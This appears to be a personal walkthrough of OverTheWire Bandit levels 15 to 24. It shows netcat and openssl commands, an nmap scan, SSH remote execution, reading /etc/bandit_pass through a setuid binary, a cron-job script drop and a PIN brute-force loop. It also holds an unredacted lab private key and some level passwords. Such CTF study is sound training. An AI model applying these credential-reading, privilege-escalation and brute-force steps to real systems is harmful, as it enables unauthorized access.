When a computer pings this IP address , it is communicating with itself ...


## -------------------------------------------------------------------------------- 

Netcat - ( As a Standard Deserves its OWN Write Up ... Git W/O ... ) 
       - Abbreviated Here by the Command ' nc ' , ' nc ' Essensially
       - Allows to Read and Write Data OVER a Network Connection ...
       - It can be used for TCP and UDP connections , Eyes Below ...

((( [ nc -nlvp l337 ]  ... [ nc localhost 1337 ] ))) 

((( [ nc -ul -p 1337 ] ... [ echo "test" | nc -u 127.0.0.1 1337 ] )))

## -------------------------------------------------------------------------------- 


[ nc localhost 30000 , DC33...R..E..D..A..C..T..E..D... ]

> Correct!
> DC33...R..E..D..A..C..T..E..D...

DC33...R..E..D..A..C..T..E..D...



## bandit 15

Level Goal :

The password for the next level can be retrieved by submitting the password of the current level 
to port 30001 on localhost using SSL encryption.

Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? 
Use -ign_eof and read the “CONNECTED COMMANDS” section in the manpage. 
Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command…

OpenSSL - Library used for Secure Communication over networks. 
OpenSSL - Implements the Transport Layer Security (TLS) and Secure Sockets Layer (SSL) Cryptographic Protocols.
OpenSSL - Cookbook @ https://www.feistyduck.com/library/openssl-cookbook/online/


[ openssl s_client -connect localhost:30001 ]

openssl s_client - simple client that connects to a server using SSL/TLS.

> CONNECTED(00000003)
> Can't use SSL_get_servername
> depth=0 CN = localhost
> verify error:num=18:self-signed certificate
> verify return:1
> depth=0 CN = localhost
> verify error:num=10:certificate has expired
> notAfter=May 16 18:15:26 2024 GMT
> verify return:1
> depth=0 CN = localhost
> notAfter=May 16 18:15:26 2024 GMT
> verify return:1
---
---
---
> Post-Handshake New Session Ticket arrived:
> SSL-Session:
>    Protocol  : TLSv1.3
>    Cipher    : TLS_AES_256_GCM_SHA384
>    Session-ID: 9B6CD45700CF7833ED9621287471642BAB2740D1F18A6C8AF235BB6B057F51A7
>    Session-ID-ctx: 
>    Resumption PSK: 0109BD95CCFCFECF34849BB567AEFC66C9D1AFB26A7E871AA5CC9DC065D87EF0833B4D91FE107C4A7FEBAB43BE35BD01
>    PSK identity: None
>    PSK identity hint: None
>    SRP username: None
>    TLS session ticket lifetime hint: 7200 (seconds)
>    TLS session ticket:
>    0000 - f7 65 b7 1c c8 5b 5a f4-f9 8e fa 30 46 14 f0 e3   .e...[Z....0F...
>    0010 - e8 cd 6d 72 ee 1a f1 5a-70 7b ea d8 34 d9 dc 87   ..mr...Zp{..4...
>    0020 - 6f 6a 41 62 62 e0 f2 4f-ac da 56 9f 74 cd f7 19   ojAbb..O..V.t...
>    0030 - 0d 4d 46 86 64 75 ba 74-69 a8 21 85 b9 c7 df 43   .MF.du.ti.!....C
>    0040 - af 8d 4d 3b 4b 9a 7d 7f-db 09 d9 0d b3 39 64 9c   ..M;K.}......9d.
>    0050 - a8 9a 66 b5 37 c5 b9 e7-7c 6e 72 29 b1 e4 09 d7   ..f.7...|nr)....
>    0060 - 4e d2 ec e9 53 eb 8b 1f-08 b7 58 cf ff 1c bd 4a   N...S.....X....J
>    0070 - c8 9a 80 7b 3a 64 21 26-cb 75 c1 0d 16 9a 82 d2   ...{:d!&.u......
>    0080 - b7 24 3d d7 83 a4 a9 71-be 96 05 ca 01 6c 6f cd   .$=....q.....lo.
>    0090 - be 8b ed 84 b9 68 f7 fd-56 cb 4e 07 23 e5 e5 74   .....h..V.N.#..t
>    00a0 - 64 99 49 b5 cc 64 ea 53-93 21 6c 33 3d 54 11 20   d.I..d.S.!l3=T. 
>    00b0 - 3a aa 5f c7 1e b5 51 fc-b3 3a 2d 91 df fe c0 04   :._...Q..:-.....
>    00c0 - 5f b4 c0 0d 6b 3e 09 a4-f1 14 e3 2f ca 2c 75 f7   _...k>...../.,u.
>
>    Start Time: 1715885719
>    Timeout   : 7200 (sec)
>    Verify return code: 10 (certificate has expired)
>    Extended master secret: no
>    Max Early Data: 0
---
> read R BLOCK

[ DC33...R..E..D..A..C..T..E..D... ]

> Correct!
> DC33...R..E..D..A..C..T..E..D...

## -------------------------------- ALT ---------------------------------

[ echo 'DC33...R..E..D..A..C..T..E..D...' | openssl s_client -connect localhost:30001 -ign_eof ]

> CONNECTED(00000003)
> depth=0 CN = localhost
> verify error:num=18:self signed certificate
> verify return:1
> depth=0 CN = localhost
> verify return:1
> ---
> Certificate chain
> 0 s:/CN=localhost
>   i:/CN=localhost
> ---
> Server certificate
> -----BEGIN CERTIFICATE-----
> MIICBjCCAW+gAwIBAgIEBadydTANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls
> b2NhbGhvc3QwHhcNMTkwMjI3MDg1MTQ5WhcNMjAwMjI3MDg1MTQ5WjAUMRIwEAYD
> VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMyEZzRA
> ...
>    Start Time: 1553260726
>    Timeout   : 7200 (sec)
>    Verify return code: 18 (self signed certificate)
>    Extended master secret: yes
> ---
> Correct!
> DC33...R..E..D..A..C..T..E..D...
> closed

DC33...R..E..D..A..C..T..E..D...



## Bandit 16

Level Goal :

The credentials for the next level can be retrieved by submitting the password of the current level ,
to a port on localhost in the range 31000 to 32000. 

First find out which of these ports have a server listening on them. 
Then find out which of those speak SSL and which don’t. 

There is only 1 server that will give the next credentials , 
the others will simply send back to you whatever you send to it.


[ nmap -sV localhost -p 31000-32000 ]

nmap - Port Scanner ... MVP
-sV  - Show Services and Versions
-p   - Port Range ie 31000-32000

> Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-16 19:49 UTC
> Nmap scan report for localhost (127.0.0.1)
> Host is up (0.00010s latency).
> Not shown: 996 closed ports
> PORT      STATE SERVICE     VERSION
> 31046/tcp open  echo
> 31518/tcp open  ssl/echo
> 31691/tcp open  echo
> 31790/tcp open  ssl/unknown
> 31960/tcp open  echo

> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> Nmap done: 1 IP address (1 host up) scanned in 98.27 seconds

[ openssl s_client -connect localhost:31790 ]

> CONNECTED(00000003)
> Can't use SSL_get_servername
> depth=0 CN = localhost
> verify error:num=18:self-signed certificate
> verify return:1
> depth=0 CN = localhost
> verify error:num=10:certificate has expired
> notAfter=May 16 18:15:28 2024 GMT
> verify return:1
> depth=0 CN = localhost
> notAfter=May 16 18:15:28 2024 GMT
> verify return:1
---
---
---
>read R BLOCK

[ DC33...R..E..D..A..C..T..E..D... ]

> Correct!

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

> closed

[ exit ]

DC33@Redacted ...

[ echo "-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----" > sshkeyB17.private ]

[ chmod 700 sshB17.private ]



## Bandit 17

Level Goal :

There are 2 files in the homedirectory: passwords.old and passwords.new .
The password for the next level is in passwords.new and ... 

Is the only line that has been changed between passwords.old and passwords.new

NOTE: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18 ,
this is related to the next level - bandit19

[ ssh -i sshkeyB17.private bandit17@bandit.labs.overthewire.org -p 2220 ]

[ ls -la ]

> bandit17@bandit:~$ ls -la
> total 36
> drwxr-xr-x  3 root     root     4096 Oct  5  2023 .
> drwxr-xr-x 70 root     root     4096 Oct  5  2023 ..
> -rw-r-----  1 bandit17 bandit17   33 Oct  5  2023 .bandit16.password
> -rw-r--r--  1 root     root      220 Jan  6  2022 .bash_logout
> -rw-r--r--  1 root     root     3771 Jan  6  2022 .bashrc
> -rw-r-----  1 bandit18 bandit17 3300 Oct  5  2023 passwords.new
> -rw-r-----  1 bandit18 bandit17 3300 Oct  5  2023 passwords.old
> -rw-r--r--  1 root     root      807 Jan  6  2022 .profile
> drwxr-xr-x  2 root     root     4096 Oct  5  2023 .ssh

[ cat passwords.old | head ]

fMOYjvUY5uCDCbweKVmOqsxGmiqCug2W
i9zj4BOYY9OATSdwqBnAAsPTyoOpdlVW
4ipWQKzhSdNXLNkn3ytQAXapg0sm21xj
vCSTATER0iHC3AcfoaaugfYPpe2KbxlY
zeRdb0bCAurzvgkBbrdn1Vd2k7EzEquQ
63a4svAasv5xD1SsKq7UejZkFMwQ8TrC
ESR2tsFvQVuPdheIrV1cQHRzWPqjEspR
hIZ7ehVTkQ0iU8z3HIQaUBH9at9yRvpP
ub3exqqKUBxwGYvP93GkoZdNgYMCg2ax
25LhvrMLb4x4qFsl7CDsTi2bxI5OImIr

[ cat passwords.new | head ]

fMOYjvUY5uCDCbweKVmOqsxGmiqCug2W
i9zj4BOYY9OATSdwqBnAAsPTyoOpdlVW
4ipWQKzhSdNXLNkn3ytQAXapg0sm21xj
vCSTATER0iHC3AcfoaaugfYPpe2KbxlY
zeRdb0bCAurzvgkBbrdn1Vd2k7EzEquQ
63a4svAasv5xD1SsKq7UejZkFMwQ8TrC
ESR2tsFvQVuPdheIrV1cQHRzWPqjEspR
hIZ7ehVTkQ0iU8z3HIQaUBH9at9yRvpP
ub3exqqKUBxwGYvP93GkoZdNgYMCg2ax
25LhvrMLb4x4qFsl7CDsTi2bxI5OImIr

[ diff passwords.old passwords.new ]

diff - Command Prints the DIFFERENCE Between two files ...

> 42c42
> < DC33...R..E..D..A..C..T..E..D...
> ---
> > DC33...R..E..D..A..C..T..E..D...

[ sort passwords.old passwords.new | uniq -u ]

sort  -  Sort Lines of Text Files
uniq  -  Report or Omit Repeated Lines
-u    -  --unique , Only Print UNIQUE Lines

> DC33...R..E..D..A..C..T..E..D...
> DC33...R..E..D..A..C..T..E..D...

[ cat passwords.new | grep p6ggwdNHncnmCNxuAt0KtKVq185ZU7AW ]

>

[ cat passwords.new | grep hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg ]

> DC33...R..E..D..A..C..T..E..D...

DC33...R..E..D..A..C..T..E..D...




## bandit 18

Level Goal :

The password for the next level is stored in a file readme in the homedirectory... 
Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.

[ ssh bandit18@bandit.labs.overthewire.org -p 2220 , hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg ]

...

> --[ More information ]--
>
>  For more information regarding individual wargames, visit
>  http://www.overthewire.org/wargames/
>
>  For support, questions or comments, contact us on discord or IRC.

>  Enjoy your stay!

> Byebye !
> Connection to bandit.labs.overthewire.org closed.


‘.bashrc’ is a File that is RUN Every Time a Terminal is Loaded ... 

This ALSO Runs when LOGGING in Through SSH because it Runs Through a Terminal...

SSH does not just allow logging into a machine remotely , 
SSH ALSO ALLOWS ... REMOTE EXECUTION ... of Commands ...
By Adding Commands ... AFTER the Common SSH Expression .

[ ssh bandit18@bandit.labs.overthewire.org -p 2220 ls ]

> readme

[ ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme ]

> DC33...R..E..D..A..C..T..E..D...

DC33...R..E..D..A..C..T..E..D...


## --------------------------------- ALT ---------------------------------


[ ssh bandit18@bandit.labs.overthewire.org -p 2220 /bin/bash ] 

/bin/bash  -  Spawn a Bash Shell ... 

>                         _                     _ _ _   
>                        | |__   __ _ _ __   __| (_) |_ 
>                        | '_ \ / _` | '_ \ / _` | | __|
>                        | |_) | (_| | | | | (_| | | |_ 
>                        |_.__/ \__,_|_| |_|\__,_|_|\__|
>                                                       
>
>                      This is an OverTheWire game server. 
>            More information on http://www.overthewire.org/wargames
>
> bandit18@bandit.labs.overthewire.org's password: hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg

> ls
> readme
> cat readme
> DC33...R..E..D..A..C..T..E..D... 

DC33...R..E..D..A..C..T..E..D...




## bandit19

Level Goal : 

To gain access to the next level, you should use the setuid binary in the homedirectory. 
Execute it without arguments to find out how to use it. 

The password for this level can be found in the usual place (/etc/bandit_pass) ...
after you have used the setuid binary.


[ ssh bandit18@bandit.labs.overthewire.org -p 2220 , ls -la ]

> bandit19@bandit:~$ ls -la
> total 28
> drwxr-xr-x  2 root     root     4096 May  7  2020 .
> drwxr-xr-x 41 root     root     4096 May  7  2020 ..
> -rwsr-x---  1 bandit20 bandit19 7296 May  7  2020 bandit20-do
> -rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
> -rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
> -rw-r--r--  1 root     root      675 May 15  2017 .profile

[ ./bandit20-do ]

> Run a command as another user.
> Example: ./bandit20-do id

[ ./bandit20-do cat /etc/bandit_pass/bandit20 ]

> DC33...R..E..D..A..C..T..E..D...

DC33...R..E..D..A..C..T..E..D...




## bandit20

Level Goal : 

There is a setuid binary in the homedirectory that does the following: 
it makes a connection to localhost on the port you specify as a commandline argument. 

It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). 
If the password is correct, it will transmit the password for the next level (bandit21).

NOTE: Try connecting to your own network daemon to see if it works as you think


[ ls -ls , ./suconnect ] 

> Usage: ./suconnect <portnumber>
> This program will connect to the given port on localhost using TCP.
> If it receives the correct password from the other side, the next password is transmitted back.

[ echo 'DC33...R..E..D..A..C..T..E..D...' | nc -lp 1337 & ]

echo '' |  - Pass the 'string' and (Push...) Pipe it too ... 
nc -lp     - Netcat , --listen , --port 
&          - Ampersand will then Run the Command in the BACKGROUND .

> [1] 341933

[ jobs ]

jobs       - Display Status of ... JOBS in the Current Session ...

> [1]+  Running                 echo 'VxCazJaVykI6W36BkBU0mJTCM8rR95XT' | nc -lp 1337 &

[ ./suconnect 1337 ]

> Read: DC33...R..E..D..A..C..T..E..D...
> Password matches, sending next password
> DC33...R..E..D..A..C..T..E..D...




## bandit 21

Level Goal :

A program is running automatically at regular intervals from cron, the time-based job scheduler. 
Look in /etc/cron.d/ for the configuration and see what command is being executed.

[ ls -la /etc/cron.d ]

> -rw-r--r--   1 root root    62 Oct  5  2023 cronjob_bandit15_root
> -rw-r--r--   1 root root    62 Oct  5  2023 cronjob_bandit17_root
> -rw-r--r--   1 root root   120 Oct  5  2023 cronjob_bandit22
> -rw-r--r--   1 root root   122 Oct  5  2023 cronjob_bandit23
> -rw-r--r--   1 root root   120 Oct  5  2023 cronjob_bandit24
> -rw-r--r--   1 root root    62 Oct  5  2023 cronjob_bandit25_root
> -rw-r--r--   1 root root   201 Jan  8  2022 e2scrub_all
> -rwx------   1 root root    52 Oct  5  2023 otw-tmp-dir
> -rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
> -rw-r--r--   1 root root   396 Feb  2  2021 sysstat

[ cat /etc/cron.d/cronjob_bandit22 ]

> @reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
> * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null

cron  -  Is a DAEMON used to Execute Scheduled Commands ...

This CRONJOB Runs the /usr/bin/cronjob_bandit22.sh File as User bandit22 . 
The FIVE Asterisk ( Wildcard ) Indicates that it is Run ... EVERY Minute .

[ cat /usr/bin/cronjob_bandit22.sh ]

> #!/bin/bash
> chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
> cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

chmod 644 - Owner can Read / Write , Group/Others can Read Only .

[ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv ]

> DC33...R..E..D..A..C..T..E..D...

DC33...R..E..D..A..C..T..E..D...



## bandit 22

Level Goal :

A program is running automatically at regular intervals from cron, the time-based job scheduler. 
Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: Looking at shell scripts written by other people is a very useful skill. 
The script for this level is intentionally made easy to read. 
If you are having problems understanding what it does, try executing it to see the debug information it prints.

[ ls -la /etc/cron.d ]

> drwxr-xr-x   2 root root  4096 Oct  5  2023 .
> drwxr-xr-x 106 root root 12288 Oct  5  2023 ..
> -rw-r--r--   1 root root    62 Oct  5  2023 cronjob_bandit15_root
> -rw-r--r--   1 root root    62 Oct  5  2023 cronjob_bandit17_root
> -rw-r--r--   1 root root   120 Oct  5  2023 cronjob_bandit22
> -rw-r--r--   1 root root   122 Oct  5  2023 cronjob_bandit23
> -rw-r--r--   1 root root   120 Oct  5  2023 cronjob_bandit24
> -rw-r--r--   1 root root    62 Oct  5  2023 cronjob_bandit25_root
> -rw-r--r--   1 root root   201 Jan  8  2022 e2scrub_all
> -rwx------   1 root root    52 Oct  5  2023 otw-tmp-dir
> -rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
> -rw-r--r--   1 root root   396 Feb  2  2021 sysstat

[ cat /etc/cron.d/cronjob_bandit23 ]

> @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
> * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
       
[  cat /usr/bin/cronjob_bandit23.sh ]

> #!/bin/bash
>
> myname=$(whoami)
> mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
>
> echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
>
> cat /etc/bandit_pass/$myname > /tmp/$mytarget


E/O the ‘/usr/bin/cronjob_bandit23.sh’ script ...

Initially there is a VARIABLE , ‘myname’ , which SAVES the OUTPUT From the whoami Command .

The 'mytarget' VARIABLE is Created by the Line ... echo I am user $myname | md5sum | cut -d ' ' -f 1.

Because this SCRIPT will be Run as bandit23 , the whoami command will print ‘bandit23’ .

Which then Pushes the STRING into ( md5sum ) and will RETURN the md5 hash from the STRING .

The Last INSTRUCTION ( cut -d ' ' -f 1 ) REMOVES EVERYTHING AFTER the SPACE ...

The LAST LINE Concatenates the PASSWORD from bandit23 and WRITES it INTO a FILE in the ‘/tmp’ DIRECTORY .

ThereFore ... Switch'er'roo $myname with bandit23 , EXECUTE , and the RESULT is the FILE NAME / LOCATION ...


[ echo I am user bandit23 | md5sum | cut -d ' ' -f 1 ]

> DC33...R..E..D..A..C..T..E..D...

[ cat /tmp/DC33...R..E..D..A..C..T..E..D... ]

> DC33...R..E..D..A..C..T..E..D...

DC33...R..E..D..A..C..T..E..D...




## bandit 23

Level Goal :

A program is running automatically at regular intervals from cron, the time-based job scheduler. 
Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. 
This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…


[ ls -la /etc/cron.d ]

> cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
> cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir

[ cat /etc/cron.d/cronjob_bandit24 ]

@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

[ cat /usr/bin/cronjob_bandit24.sh ]

> #!/bin/bash
> 
> myname=$(whoami)
>
> cd /var/spool/$myname/foo
> echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
> for i in * .*;
> do
>    if [ "$i" != "." -a "$i" != ".." ];
>    then
>         echo "Handling $i"
>         owner="$(stat --format "%U" ./$i)"
>         if [ "${owner}" = "bandit23" ]; then
>             timeout -s 9 60 ./$i
>         fi
>         rm -f ./$i
>     fi
> done



The OUTPUT of the whoami Command is Getting SAVED in a VARIABLE Called myname , 

( This SCRIPT is Being EXECUTED BY bandit24 soo ... the OUTPUT of whoami will be bandit24 )

It then CHANGES DIRECTORY ... /var/spool/bandit24/foo

It then Prints a STRING ... echo " Executing... "

It than STARTS a FOR LOOP ...

for i ( FILE ) in * ( ALL FILES ) *. ( INCLUDING Hidden files )

do ( Something ... )

if $i ( FILES ) != ( are NOT equal to ) . ( CURRENT Dir ) -a ( AND ) != ( NOT EQUAL to ) .. ( PARENT Dir )

then ...

Print " Handling $i ( FILE Name ) "

owner ( VARIABLE ) = 

" stat ( DISPLAY File or File SYSTEM STATUS ) --format ( use the SPECIFIED FORMAT ) "%U" ( USER NAME of OWNER ) ./$i ( of this FILE ) " 

if   ... the OWNER is bandit23

then ...  TIMEOUT ( Run a Command with a TIME LIMIT ) -s 9 ( Send SIGNAL to Terminate aka KILL ) 60 ( AFTER 60 Seconds ) ./$i ( FILE to be EXECUTED )

fi ( ONCE FINISHED ... )

rm ( REMOVE ) -f ( FORCEFULLY ... ) ./$i ( said FILE )

fi ( Once thats FINISHED ... )

done ( ENDS the LOOP )



The “cronjob_bandit24.sh” Script EXECUTES AND DELETES ALL FILES in the /var/spool/bandit24/foo/ DIRECTORY ,
IGNORING the “.” ( CURRENT Directory ) and “..” ( PARENT Directory) via the First IF Statement ...

The Second IF Statment GOES THROUGH the Files and it CHECKS if the OWNER is ... “bandit23” and if so ...
It EXECUTES the File with a TIMEOUT of 60 SECONDS and then ... DELETES it ...



[ mkdir /tmp/nocco , cd /tmp/nocco ]

[ nano nocco.sh ]

> #!/bin/bash
> 
> cat /etc/bandit_pass/bandit24 > /tmp/nocco/bandit24flag

[ ctrl + x , y , ls , cat nocco.sh ]

... c o n f i r m a t i o n  d r i l l s ...

[ touch bandit24flag , ls -la , chmod 777 -R /tmp/nocco , ls -la ]

... c o n f i r m a t i o n  d r i l l s ...

Should NEVER 777 ... HOWEVER ... its Only ( A Game ... ) on This tmp Directory . 

[ cp nocco.sh /var/spool/bandit24/foo ]

copy nocco.sh too ... /var/spool/bandit24/foo/

[ ls nocco.sh /var/spool/bandit24/foo/nocco.sh ]

... c o n f i r m a t i o n  d r i l l s ...

> nocco.sh  /var/spool/bandit24/foo/nocco.sh

...           W/O 60 seconds +           ...

[ ls nocco.sh /var/spool/bandit24/foo/nocco.sh ]

> ls: cannot access '/var/spool/bandit24/foo/nocco.sh': No such file or directory

[ cat bandit24flag ]

> DC33...R..E..D..A..C..T..E..D...

DC33...R..E..D..A..C..T..E..D...




## bandit 24

Level Goal :

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 ... 
and a secret numeric 4-digit pincode. 

There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

You do not need to create new connections each time.


[ nmap localhost -p 30002 ]

> Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-18 14:46 UTC
> Nmap scan report for localhost (127.0.0.1)
> Host is up (0.000082s latency).
>
> PORT      STATE SERVICE
> 30002/tcp open  pago-services2
>
> Nmap done: 1 IP address (1 host up) scanned in 0.03 seconds

[ nc localhost 30002 ]

> I am the pincode checker for user bandit25.
> Please enter the password for user bandit24 and the secret pincode on a single line,
> separated by a space.

[ DC33...R..E..D..A..C..T..E..D... 1337 ]

> Wrong! Please enter the correct pincode. Try again.

--- W/O ---

> Timeout. Exiting.

[ mkdir /tmp/knocknocco , cd /tmp/knocknocco ]

As OPPOSED too mktemp -d ( Which would Spawn a Random ... *Id Est* /tmp/tmp.OgybeKestD )

[ nano pinbrute.sh ]

> GNU nano 6.2                          pinbrute.sh                                      
>
> #!/bin/bash
>
> for i in {0000..9999}
> do
>        echo "DC33...R..E..D..A..C..T..E..D... $i"
> done

[ ctrl + x , y ]

Exit , Save Changes

[ chmod +x ./pinbrute ]

Make eXecutable

[ /pinbrute.sh | nc localhost 30002 ]

Run Script AND Pipe too ... nc localhost 30002

> I am the pincode checker for user bandit25.
> Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.

...

> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.
> Correct!
> The password of user bandit25 is DC33...R..E..D..A..C..T..E..D...

[ ./pinbrute.sh | nc localhost 30002 > flag.txt ]

The Deamon is Instructed to Close Connection AFTER the Correct Pin is Entered ...

( > flag.txt Pushes the OUTPUT too a File Named ... flag.txt )

